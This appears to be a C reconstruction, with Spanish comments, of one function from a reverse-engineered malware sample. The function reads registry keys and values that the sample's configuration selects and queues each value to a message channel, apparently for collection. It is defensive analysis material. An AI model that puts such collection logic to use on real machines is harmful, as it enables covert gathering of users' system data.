/* ============================================================
 * Capacidad 11/15 — Inventario de registro
 * Función C : CollectRegistryValues
 * Dirección : 0x1800226d   · Nodo N4   · Confianza: Media
 * ------------------------------------------------------------
 * Lee claves y valores del registro indicados por la configuración
 * (vector +0x18, entradas de 0x60 bytes) sobre raíces configurables
 * HKLM/HKCU/HKU/HKCR/HKCC. Es lectura (RegOpenKeyExW /
 * RegQueryValueExW); no se observó escritura de registro para
 * persistencia.
 * ============================================================
 */

#include "00_tipos_comunes.h"

/* Mapea la raíz configurada a su HKEY (HKLM/HKCU/HKU/HKCR/HKCC). */
static HKEY MapRootHive(uint32_t hive)
{
    switch (hive) {
    case 0: return HKEY_LOCAL_MACHINE;
    case 1: return HKEY_CURRENT_USER;
    case 2: return HKEY_USERS;
    case 3: return HKEY_CLASSES_ROOT;
    case 4: return HKEY_CURRENT_CONFIG;
    default: return HKEY_CURRENT_USER;
    }
}

/* ------------------------------------------------------------------
 * 0x1800226d — lectura de claves/valores indicados por la
 * configuración [condicionado]. Solo lectura: no se observa escritura
 * de registro para persistencia.
 * ------------------------------------------------------------------ */
void CollectRegistryValues(const RegistryQueryList *list, Channel *channel)
{
    if (list == NULL || list->items == NULL || channel == NULL)
        return;

    for (size_t i = 0; i < list->count; i++) {
        const RegistryQueryItem *item = &list->items[i];

        HKEY root = MapRootHive(item->hive);
        HKEY key  = NULL;

        if (RegOpenKeyExW(root, item->subkey, 0, KEY_READ, &key) != ERROR_SUCCESS)
            continue;

        /* Dos pasadas: tamaño y lectura. */
        DWORD size = 0;
        if (RegQueryValueExW(key, item->value_name, NULL, NULL, NULL, &size)
                == ERROR_SUCCESS && size > 0) {

            ByteBuffer value;
            value.len  = size;
            value.cap  = size;
            value.data = (uint8_t *)HeapAlloc(GetProcessHeap(), 0, size);
            if (value.data != NULL) {
                DWORD type = 0;
                if (RegQueryValueExW(key, item->value_name, NULL, &type,
                                     value.data, &value.len) == ERROR_SUCCESS) {
                    QueueTypedMessage(channel, MSG_APP_OR_REGISTRY, value);
                } else {
                    HeapFree(GetProcessHeap(), 0, value.data);
                }
            }
        }
        RegCloseKey(key);
    }
}
